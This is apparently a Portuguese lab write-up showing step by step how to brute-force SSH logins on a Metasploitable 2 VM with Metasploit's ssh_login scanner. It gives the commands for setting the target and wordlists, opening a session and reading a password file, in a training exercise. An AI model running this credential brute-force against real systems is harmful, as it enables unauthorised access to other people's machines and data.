# Explorando falha no SSH

> Laboratório: Falha no SSH


---


## 1) VM — Imagem da máquina vulnerável

![Metasploitable 2 — VM vulnerável](images/Maquina_vulneravel.png)

*Captura da máquina Metasploitable 2 utilizada no laboratório.*


## 2) Iniciando o Metasploit
![2](images/Iniciando_metasploit.png)

**Comando usado:**
```
msfconsole
```

## 3) Pesquisando vulnerabilidade no metasploit
![3](images/Pesquisando_vulnerabilidade_SSH.png)

**Comando usado:**
```
search ssh_login
```

## 4) Selecionando vulnerabilidade
![4](images/Usando_vulnerabilidade.png)

**Comando usado:**
```
use auxiliary/scanner/ssh/ssh_login
```

## 5) Informações da vulnerabilidade
![5](images/Vendo_informações_para_funcionamento_da_vulnerabilidae.png)

**Comando usado:**
```
info
```

## 6) Selecionando Host para atacar

![6](images/selecionando_RHOST.png)

**Comando usado:**
```
set rhosts 192.168.56.103
```

## 7) Escolhendo wordlist com senha e usuario
![7](images/escolhendo_arquivos_de_senha_e_usuario.png)

**Comando usado:**
```
set USER_FILE /home/kali/usuario.txt
set PASS_FILE /home/kali/senha.txt
```

## 8) Iniciando exploit e obtendo acesso com brute force
![8](images/inciando_exploit_e_tendo_acesso_com_brute_force.png)

**Comando usado:**
```
exploit
```

## 9) Vendo sessões abertas
![9](images/vendo_sessoes_abertas.png)

**Comando usado:**
```
sessions
```

## 10) Selecionando sessão
![10](images/selecionando_sessao.png)

**Comando usado:**
```
sessions 1
```

## 11) Acesso a VM
![11](images/acesso_a_maquina_vulneravel.png)

## 12) Criando um arquivo de senha na VM vulnerável
![12](images/criando_um_arquivo_de_senha_na_maquina_vulneravel.png)

## 13) Vendo arquivo de senha pela máquina invasora
![13](images/vendo_arquivo_com_senha_pela_maquina_invasora.png)

**Comando usado:**
```
ls
```

## 14) Lendo arquivo pela máquina invasora
![14](images/lendo_arquivo_de_senha.png)

**Comando usado:**
```
cat senha_secreta.txt
```

